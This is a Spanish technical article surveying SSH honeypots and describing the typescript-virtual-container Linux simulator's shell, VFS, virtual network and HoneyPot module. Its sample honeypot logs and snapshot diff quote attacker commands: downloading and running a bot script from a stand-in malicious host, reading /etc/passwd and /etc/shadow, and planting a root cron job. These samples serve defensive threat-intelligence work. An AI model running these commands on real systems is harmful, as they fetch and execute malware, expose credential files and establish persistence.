const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Enviar al xterm.js del navegador vía WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Transmitir las pulsaciones del navegador al shell
  shell.write(data);
});
```

Es el esquema estándar para los IDE cloud y los terminales web: xterm.js (navegador) ↔ WebSocket ↔ node-pty ↔ verdadero bash. El aislamiento sigue siendo inexistente. El shell se ejecuta con todos los permisos del proceso Node.js (o del usuario que lo lanza).

**Mantenido por**: Microsoft.
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Parte 4: Los honeypots SSH

Los honeypots están diseñados para ser atacados. El objetivo es parecer lo bastante real para que los atacantes interactúen con ellos, registrando todo lo que hacen para la inteligencia de amenazas. SSH es el objetivo principal porque es el servicio más atacado en internet: si expones el puerto 22 en una IP pública, verás intentos de escaneo automatizados en unos minutos literalmente. Prueba un día, da bastante miedo lo rápido que llega.

La calidad de un honeypot se mide en dos cosas: la **fidelidad** (hasta qué punto imita de forma convincente un verdadero sistema) y la **telemetría** (cuántos datos útiles captura). Esas dos cosas están en tensión. Un honeypot de alta fidelidad es más difícil de construir y más arriesgado de operar.

Esta sección es lo que finalmente me llevó a construir el módulo `HoneyPot` en `typescript-virtual-container`, así que tengo algunas opiniones aquí.

### 4.1 Cowrie: el patrón oro

Cowrie es un honeypot SSH y Telnet de interacción media-alta basado en Python. Es el honeypot SSH más desplegado en la comunidad de investigación y seguridad.

Arquitectura:
- **Capa protocolo**: implementación real del protocolo SSH (Twisted Conch), así los atacantes tienen verdaderos handshakes, verdadero intercambio de claves, verdadera autenticación
- **Capa shell**: un falso sistema de archivos (parecido a Debian 5.0) y un intérprete de shell parcial que responde a los comandos comunes
- **Modo proxy**: puede redirigir hacia un verdadero sistema detrás (modo alta interacción), registrando todo lo que pasa
- **Modo LLM** (añadido reciente): usa un modelo de lenguaje para generar respuestas dinámicas a los comandos que no sabe gestionar: sí, Cowrie ahora tiene un modo IA. Vivimos una época loca.

```python
# Lo que Cowrie captura
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie guarda los archivos descargados (vía wget/curl/SFTP/SCP) para el análisis de malware. Se integra con Splunk, Elasticsearch, y otras plataformas SIEM.

**Fidelidad**: media-alta. Lo bastante convincente para engañar a los bots automatizados (que son el 99% de los atacantes SSH: la mayoría son solo scripts tontos que prueban `root`/`password`). Humanos sofisticados pueden identificarlo por huella digital, generalmente bastante rápido.

**Lenguaje**: Python (Twisted)
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo: el predecesor de Cowrie

Kippo es el honeypot SSH de interacción media original en el que se basó Cowrie. Misma idea base: verdadero protocolo SSH, falso sistema de archivos, shell parcial. Cowrie lo suplantó por completo a estas alturas: Kippo está archivado y nadie debería usarlo en 2026. Mencionado aquí puramente por exhaustividad histórica, porque podrías verlo referenciado en viejos artículos de blog y papers de seguridad.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo): archivado

---

### 4.3 endlessh: el tarpit SSH

endlessh es un honeypot degenerado: mantiene las conexiones SSH abiertas difundiendo lentamente los datos del banner a 1 byte por segundo (o menos). Un cliente SSH que se conecta quedará bloqueado indefinidamente: nunca llegará a la autenticación porque el servidor nunca termina de enviar el banner.

El objetivo no es la inteligencia de amenazas sino el puro rechazo de recurso: ocupar los hilos de escaneo de los atacantes para que no puedan alcanzar los verdaderos objetivos tan rápido. Es honestamente un poco diabólico en el buen sentido. No aprendes nada del atacante: solo le haces perder su tiempo. Hay algo profundamente satisfactorio en eso.

```c
// Todo el comportamiento protocolar de endlessh:
// Enviar: "SSH-2.0-OpenSSH_" y luego añadir lentamente caracteres aleatorios
// No cerrar nunca la conexión
// El escáner del atacante expira tras N segundos
```

Ningún comando se captura. Ninguna autenticación se prueba. Solo tiempo de conexión.

**Escrito en**: C
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame: el honeypot "deja entrar a todo el mundo"

sshesame acepta todas las conexiones SSH (cualquier usuario, cualquier contraseña, cualquier clave) y lo registra todo. Es un honeypot de cero interacción: no responde a los comandos, solo deja "entrar" a los atacantes y registra cada tecla que escriben.

```
2024-01-15 03:22:11 Conexión desde 45.33.32.156
  Usuario: root, Contraseña: password123: aceptado
  Comandos escritos:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Desconectado tras 47s
```

Útil para la cosecha de credenciales: acumulas rápido los nombres de usuario y contraseñas que prueban los bots, lo que te dice qué credenciales por defecto están siendo bruteforceadas activamente. Spoiler: siempre es `root`/`password`, `admin`/`admin`, y `root`/`123456`. Cada vez.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird: framework de honeypot basado en Docker

`lyrebird/honeypot-base` es una imagen base Docker para construir honeypots de servicios red. No es específicamente un honeypot SSH: es un framework para construir honeypots para cualquier protocolo.

La imagen base aporta un framework de registro, un sistema de plugins para los protocolos, y configuraciones Docker Compose para honeypots multiservicio. La extiendes para simular servicios específicos.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Construir un honeypot SSH en Node.js: el método ingenuo, y por qué falla

Antes de `typescript-virtual-container`, construir un honeypot SSH en Node.js significaba combinar la verdadera librería `ssh2` con una simulación manual de comandos. Muy tedioso, muy incompleto, pero... es un paso obligado a estas alturas:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Registrar el intento
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Dejar entrar a todo el mundo
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Respuesta simulada
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Eso "funciona" en el sentido de que captura las credenciales y los comandos. Pero es obviamente falso en cuanto un atacante sofisticado escarba un poco. `uname -a` devuelve la buena cadena pero `ls /etc` devuelve "command not found": huele a trampa a pleno. El sistema de archivos no existe. Los comandos no se encadenan. Los pipes no funcionan. Las variables no se expanden.

Un atacante competente identificará tu honeypot en los cinco primeros comandos. Los scripts automatizados que buscan un comportamiento tipo Cowrie también lo detectarán de inmediato. Al parecer eso empujó a la autora de `typescript-virtual-container` a construir algo que interpreta de verdad los comandos: más sobre eso en la Parte 5.

---

### Resumen de la familia de los honeypots

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Ingenuo ssh2 |
|---|---|---|---|---|---|---|
| **Nivel de interacción** | medio-alto | medio | cero | cero | variable | bajo |
| **Verdadero protocolo SSH** | ✅ | ✅ | ❌ (tarpit) | ✅ | variable | ✅ |
| **Fidelidad del shell** | media | media | n/a | ninguna | variable | mínima |
| **Captura las credenciales** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Captura los comandos** | ✅ | ✅ | ❌ | ✅ | variable | ✅ |
| **Captura los malwares** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Integración SIEM** | ✅ nativa | ❌ | ❌ | ❌ | ❌ | manual |
| **Respuestas LLM** | ✅ (nuevo) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Lenguaje** | Python | Python | C | Go | Docker | Node.js |
| **Node.js nativo** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Estado** | ✅ muy activo | ⚠️ archivado | ✅ activo | ✅ activo | ✅ activo | DIY |

El patrón aquí es bastante claro: cuanto más fidelidad quieres, más Python tienes que escribir. Cowrie es el vencedor indiscutido si haces eso en serio: lleva probado en el campo durante años y captura mucho más que simples credenciales. endlessh y sshesame son proyectos simpáticos más que herramientas serias de inteligencia de amenazas. Y el enfoque ingenuo en Node.js te lleva quizá al 20% del camino antes de chocar con un muro.

---

## Parte 5: `typescript-virtual-container`: lo que llena el hueco

OK aquí las cosas se vuelven interesantes. Tras catalogar todas las familias de arriba, el cuadrante que falta se vuelve bastante evidente:

- Los sandboxes JS: aíslan el código, sin shell, sin sistema de archivos, sin SSH
- Los emuladores Linux: verdadero SO, verdadero shell, verdadero SSH... pero 150+ MB de RAM, 30 segundos de arranque, y tienes que construir tu propia API sobre las E/S serie
- Los honeypots: falso shell, sin API programable, Python/Go/C, no nativo Node

Nadie había construido un entorno Linux completo, programable, nativo Node, con verdadero SSH, verdaderos permisos, verdadera red virtual, y una API TypeScript tipada. Así que ella lo construyó.

Pequeña introducción porque es la primera vez que la menciono correctamente: `typescript-virtual-container` lo construyó [Chloé Rolzhausen](https://itsrealfortune.fr), una desarrolladora francesa que se hace llamar **Fortune** (o ItsRealFortune) en línea. Puedes encontrarla en su [sitio web](https://itsrealfortune.fr) y en [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Todo el proyecto: 56 000 líneas de TypeScript, 247 archivos, 170 comandos, fue un esfuerzo en solitario por una sola persona. La llamaré Fortune para el resto del artículo. Y sí, es bastante loco. ¡Ve a echar un ojo a su trabajo!

### Lo que es realmente

`typescript-virtual-container` es un **simulador de entorno Linux** escrito en TypeScript puro. Sin Wasm, sin extensiones nativas, sin núcleo. ~56 000 líneas de fuente repartidas en 247 archivos TypeScript.

La idea clave: no necesitas un emulador CPU para hacer funcionar `ls /etc | grep passwd`. Necesitas:
1. Un árbol de nodos en memoria que respondan a las operaciones de ruta
2. Un modelo de permisos POSIX aplicado en cada acceso
3. Un analizador sintáctico de shell que entienda pipelines, redirecciones, subshells y expansión de variables
4. ~170 implementaciones de comandos (funciones, no binarios)
5. Un sistema de gestión de usuarios y grupos
6. Algo para exponer todo eso vía SSH

Todo eso es realizable en TypeScript puro sin ninguna implicación del núcleo.

### El VirtualFileSystem

El VFS es un árbol en memoria de nodos tipados: sin E/S disco salvo si activas explícitamente el modo de persistencia `"fs"`:

```ts
// Representación interna simplificada
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder cargado perezosamente
```

Cada operación de ruta pasa por `normalizePath` (resuelve `.`, `..`, los enlaces simbólicos) y `enforceAccess` (comprueba los permisos lectura/escritura/ejecución respecto al uid/gid solicitante). `chmod`, `chown`, los sticky bits y setuid están todos implementados y realmente aplicados. Si un proceso corriendo como uid 1000 intenta leer un archivo propiedad de root con el modo 0600, obtiene EACCES: no un falso EACCES, una verdadera `Error` JavaScript lanzada desde la comprobación de permiso. Esa parte es bastante elegante honestamente.

El VFS se serializa en:
- `.vfsb`: un formato binario compacto (personalizado, con compresión fflate): es el formato por defecto
- Instantánea JSON: legible por el humano, buena para depurar
- Archivo TAR: import/export con el verdadero formato tar, así que puedes hacer `tar -xf` algo y el VFS tiene... esos archivos
- Imagen SquashFS: import en solo lectura

En modo de persistencia `"fs"`, mantiene un diario de escritura anticipada (WAL) para la recuperación tras crash: las escrituras van primero al diario, luego a la instantánea al hacer flush. Si Node se cuelga en medio de una operación, el diario te permite reconstruir el último estado completo.

También hay una capa `FileCache` que simula la latencia de las E/S disco. Configuras perfiles como `NVME_DISK_IO` o `HDD_DISK_IO` y el VFS retrasa artificialmente las operaciones sobre los archivos para corresponder a temporizaciones realistas. Lo cual es bastante divertido: un software que se ralentiza a propósito para simular material, pero en realidad muy útil para el benchmarking.

### El intérprete de shell

El analizador sintáctico del shell produce un AST tipado:

```ts
// "ls /etc | grep root && echo done" se analiza en:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

El ejecutor recorre ese AST:
- Para un pipeline, crea una cadena de flujos `{ stdin, stdout, stderr }` y ejecuta cada comando con E/S en pipeline
- Para los operadores lógicos (`&&`, `||`), comprueba `$?` tras el lado izquierdo antes de ejecutar el derecho
- Para los subshells (`$(...)`, `` ` ` ``), bifurca el contexto de ejecución
- Para las redirecciones (`>archivo`, `>>archivo`, `2>&1`, `<archivo`), configura el cableado de los flujos antes de la ejecución
- Para las tareas en segundo plano (`cmd &`), se ejecuta sin esperar el fin
- Para las variables, expande `$VAR`, `${VAR:-default}`, `${#VAR}`, y la aritmética `$((expr))`
- Para la expansión de llaves (`{a,b,c}`, `{1..5}`), genera la lista de expansión completa antes de ejecutar

Todo eso es un verdadero comportamiento shell POSIX. El analizador gestiona los heredocs, la sustitución de procesos, el globbing (`*`, `?`, `[abc]`), y la gestión de las comillas (comillas simples, comillas dobles con interpolación, escape por antislash). No es perfecto: existen casos límite, pero está muy por encima de lo que esperarías de un proyecto TypeScript.

### ~170 comandos integrados

Los comandos son funciones TypeScript registradas en un registro de comandos. Reciben un `CommandContext` con los flujos stdin/stdout/stderr, el VFS, la sesión de usuario, el entorno del shell, y el acceso a los submódulos.

Escribir 170 implementaciones de comandos Unix es... mucho. Algunas son triviales (`echo`, `true`, `false`), algunas son sorprendentemente complejas (`awk`, `find`, `tar`). O sea, un `awk` POSIX completo. ¿En TypeScript? Es una locura honestamente. Aquí una muestra de lo que hay dentro:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (lado cliente, conexión saliente),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (editor interactivo completo), vim (básico), vi (básico),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (simulado), systemctl (stub), journalctl (stub),
...y unos 130 más
```

Los "stubs" (git, python3, node) responden de forma realista a las invocaciones comunes: `python3 --version` devuelve una cadena de versión creíble, `git status` muestra un estado de repo ficticio, sin hacer verdadero trabajo. Para un honeypot, de hecho son más útiles que los verdaderos comandos, porque te permiten observar lo que los atacantes intentan ejecutar sin ejecutar nada peligroso.

### El servidor SSH

La capa SSH usa el verdadero package npm `ssh2`: verdadero protocolo SSH, verdadero intercambio de claves, verdadero cifrado. `SSHMimic` lo envuelve:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// Verdadero SSH: ssh -p 2222 root@localhost
// Verdadero SFTP: sftp -P 2222 root@localhost
// Verdadero SCP: scp -P 2222 file root@localhost:/tmp/
```

Los `shellProperties` determinan lo que `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, y `/etc/os-release` informan. Puedes imitar cualquier distribución Linux y versión de núcleo de forma convincente: para un verdadero cliente SSH, literalmente no hay forma de notar la diferencia.

### El módulo HoneyPot

Como el intérprete de shell es real y el servidor SSH es real, los comandos de los atacantes se ejecutan realmente en el entorno virtual. Las peticiones `wget` disparadas por el atacante se registran con las URL de destino. Los archivos creados por el atacante se guardan en el VFS. Los intentos de escalada de privilegios del atacante producen errores realistas.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Tras una sesión, diferenciar el sistema de archivos
const before = shell.vfs.toSnapshot();
// ... sesión del atacante ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Es cualitativamente distinto de Cowrie. El falso sistema de archivos de Cowrie puede responder a `ls` pero no puede realmente seguir los archivos que un atacante creó ni las modificaciones que aportó en forma de diff estructurado. `typescript-virtual-container` sí puede, porque el VFS es una estructura de datos viva: cada escritura se sigue. ¿Esa entrada cron que el atacante acaba de añadir? Está en el diff. ¿Esa carpeta `.hidden`? En el diff. Bastante útil para el análisis de malware.

### La pila red virtual

Es probablemente la parte más impresionante de todo el proyecto, y no tiene equivalente en ningún otro proyecto de este espacio. O sea, una pila red virtual L2/L3 completa con soporte VPN, escrita en TypeScript puro, sin ninguna tarjeta red real implicada. Es de verdad una locura.

`VirtualNetworkManager` da a cada instancia `VirtualShell` interfaces red virtuales con direcciones IP configurables, tablas de ruteo, y un cortafuegos software (reglas estilo iptables con conntrack y NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` muestran todos el estado de la red virtual.

`VirtualSwitch` (llamado Baie: de la palabra francesa para bahía de servidor, "baie informatique") conecta varios shells en una subred compartida. Implementa:
- Aprendizaje MAC y ARP
- Ruteo IP entre subredes
- NAT (masquerade saliente)
- DNS (registros configurables por subred)
- Balanceo de carga (round-robin, menores conexiones)
- Modelado del tráfico: latencia, jitter (distribución gaussiana), pérdida de paquetes, pérdida por ráfagas, reordenamiento, duplicación
- Limitación de ancho de banda (cubo de tokens)
- Aplicación MTU
- Seguimiento de conexión (con estado, estados NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Tres máquinas virtuales en el mismo conmutador
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Cortafuegos: web puede alcanzar api, api puede alcanzar db, web no puede alcanzar db directamente
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Modelado del tráfico: simular un enlace WAN inestable hacia el exterior
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` crea túneles cifrados entre instancias de Baie: puedes simular una red multisitio con interconexiones VPN entre sitios.

`VirtualProxy` implementa el forwarding de puertos y un proxy SOCKS5.

Nada de eso toca una verdadera tarjeta red. Todo es ruteo de objetos TypeScript. El comando `ping` "funciona" ruteando vía el conmutador virtual y devolviendo respuestas ICMP simuladas. `curl http://192.168.0.3/api` rutea vía la red virtual, alcanza la respuesta HTTP simulada del shell api, y devuelve el contenido. Son tortugas hasta abajo, en el mejor sentido posible.

### El `SandboxedShell`

Para un uso programático donde necesitas un aislamiento más fuerte, `SandboxedShell` ejecuta una sesión shell en un thread Worker Node.js:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% de un núcleo
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

El aislamiento aquí lo asegura la capa VFS (el shell del thread worker solo puede ver el sistema de archivos virtual, jamás el sistema de archivos anfitrión) más el aislamiento de memoria del thread Worker Node.js. Es más ligero que `isolated-vm` pero más apropiado para un aislamiento a nivel shell más que a nivel JS.

### Tope de recursos

Puedes configurar límites de recursos por shell que afectan lo que los comandos de monitoreo sistema informan:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

Dentro de ese shell, `free -m` muestra 512 MB de RAM total. `nproc` devuelve 2. `/proc/meminfo` muestra los valores topados. `htop` y `top` muestran el número de CPU topado. Eso te permite definir precisamente la huella material de la máquina simulada.

### Tres modos de despliegue

```
Modo 1: Servidor SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  → Verdadero protocolo SSH, verdadero SFTP, verdadero SCP
  → Caso de uso: honeypots, entornos de test remotos, laboratorios de formación

Modo 2: Shell web (navegador)
  builds/fortune-nyx-v1.7.8-web.min.js (bundle ESM)
  → Corre en el navegador, VFS persistido en IndexedDB
  → Caso de uso: tutoriales interactivos, terminales embebidos, demos
  → Bonus: ejecuta startxfce4 para un escritorio XFCE completo simulado

Modo 3: CLI autónomo
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (un solo archivo, sin instalación)
  → curl y ejecuta, persistido el VFS en el directorio .vfs/
  → Caso de uso: demos rápidas, experimentación local
```

### Los polyfills: cómo funciona el build navegador sin Wasm

OK esta es la parte que encuentro de verdad inteligente y que quería subrayar especialmente.

Hacer funcionar una librería Node.js en el navegador es generalmente una pesadilla. O usas un runtime Wasm (pesado, lento de cargar), o pasas semanas reemplazando manualmente cada import `node:*` por una alternativa compatible navegador. Fortune hizo lo segundo: pero muy limpiamente, escribiendo un conjunto de polyfills personalizados que viven en el directorio `polyfills/` del repo.

La pipeline de build es justo esbuild con un montón de entradas `alias`:

```js
// demo/build.js: toda la config del build navegador
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Sin Wasm, sin librería de polyfills externa, sin recurso a `webpack-node-externals`. Solo módulos con alias y algunas globales inyectadas. Déjame detallar cada uno porque algunos son de verdad impresionantes.

**`node:fs`: IndexedDB como falso sistema de archivos**

Este es mi favorito. El polyfill `node:fs` implementa la API síncrona Node.js fs (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...) sostenida por dos capas: un `Map` en memoria para las lecturas síncronas, e IndexedDB para la persistencia entre recargas de página. Las escrituras van al Map de inmediato (así `readFileSync` justo tras `writeFileSync` funciona siempre), y luego se vacían hacia IndexedDB de forma asíncrona en segundo plano.

```js
// Caché síncrona (ruta → Uint8Array | null): lecturas instantáneas
const memCache = new Map();

// Precargar todo desde IndexedDB en memCache al arrancar
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Esa es la razón por la que la instantánea VFS sobrevive a las recargas de página en el navegador: el binario `.vfsb` entero se escribe en IndexedDB vía ese polyfill, y se relee en la carga siguiente. Sin Wasm, sin servidor. Solo IndexedDB, que está en todos los navegadores desde 2011.

**`node:crypto`: SHA-256 en JS puro**

En vez de importar una librería crypto Wasm, el polyfill crypto implementa SHA-256 desde cero usando las constantes de ronda FIPS 180-4. 166 líneas de JS puro con soporte completo de salidas hex/base64/Uint8Array. Todo el hash en la librería pasa por ahí: la huella de las claves anfitrionas SSH, las sumas de control internas, todo. Compacto, cero dependencia, funciona.

**`node:os`: lee el verdadero material del navegador**

Esta es una bella atención. En vez de devolver valores ficticios codificados en duro, `node:os` lee `navigator.deviceMemory` para la RAM total y `navigator.hardwareConcurrency` para el número de CPU. Así `neofetch` en el build navegador informa de hecho algo que corresponde a tu verdadera máquina: no un stub falso `2 núcleos, 2 GB de RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB por defecto
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // analiza también navigator.userAgent para adivinar la cadena del modelo CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify`: stubs honestos**

El navegador no puede abrir sockets TCP ni ejecutar verdadero SSH, así que son stubs que lanzan un error `NotImplemented` con un mensaje claro si algo intenta usarlos. Los fallos quedan explícitos, sin `undefined` devuelto donde se espera un objeto. Solo un mensaje fuerte y claro "eso no funciona en el navegador": que es exactamente lo que quieres.

**`process.js` y `buffer.js`: globales inyectadas**

Esos dos se inyectan arriba de cada archivo del bundle vía la opción `inject` de esbuild, así `process` y `Buffer` están disponibles globalmente sin ningún import explícito. `process.js` es minúsculo: `env`, `version`, `platform: 'browser'`, `nextTick` vía `queueMicrotask`, `uptime` vía `performance.now()`. `buffer.js` es una reimplementación completa de `Buffer` sobre `Uint8Array`: todos los métodos `readUInt32BE`, `writeInt16LE`, las codificaciones hex/base64 de las que dependen la implementación SSH y el VFS.

---

El conjunto de los polyfills hace unas 640 líneas de JS escrito a mano en total. Sin packages npm, sin Wasm. Y el resultado es un bundle navegador que es justo la librería, corriendo nativamente, sin ninguna de la ansiedad habitual del "¿pero funciona de verdad en el navegador?" que tienes con las librerías diseñadas para Node primero. Vale la pena echar un ojo a la carpeta `polyfills/` en el repo si tienes curiosidad: cada archivo está bien contenido y legible por sí mismo, que es una elección de estilo que aprecio mucho.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Categoría** | Sandbox JS | Sandbox JS | Sandbox JS | Emulador | Emulador | Node.js/Wasm | Honeypot | Simulador |
| **Aísla el JS** | ⚠️ alcance | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | parcial | n/a | ✅ Worker |
| **Verdadero núcleo Linux** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Intérprete shell** | ❌ | ❌ | ❌ | ✅ (real) | ✅ (real) | ✅ (real) | parcial | ✅ (personalizado) |
| **~170 comandos Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | parcial | ~20 | ✅ |
| **Permisos POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | parcial | ✅ aplicados |
| **Gestión usuarios** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | mínima | ✅ completa |
| **Verdadero servidor SSH** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/auditoría** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/instantánea VFS** | ❌ | ❌ | ❌ | limitado | ❌ | ❌ | ❌ | ✅ |
| **Red virtual L2/L3** | ❌ | ❌ | ❌ | básica | ❌ | ❌ | ❌ | ✅ completa |
| **VPN virtual** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Soporte navegador** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js nativo** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API tipada** | básica | ✅ | ✅ | mínima | ❌ | ✅ | ❌ | ✅ completa |
| **Compatibilidad binaria** | n/a | n/a | n/a | ✅ | ✅ | parcial | n/a | ❌ |
| **Tiempo arranque** | instantáneo | instantáneo | instantáneo | 15-40s | 15-40s | 2-5s | instantáneo | <1s |
| **RAM/instancia** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Dependencias runtime** | 0 | 1 (nativa) | 1 (Wasm) | 0 | propietaria | 1 | dependencias Python | 3 (ssh2, ws, fflate) |
| **Estado** | estable | ✅ activo | ✅ activo | ✅ muy activo | comercial | ✅ activo | ✅ activo | ✅ activo |

---

## Cuándo usar qué

**Tienes que ejecutar JavaScript no fiable: una fórmula enviada por un usuario, un plugin, un hook de script.**
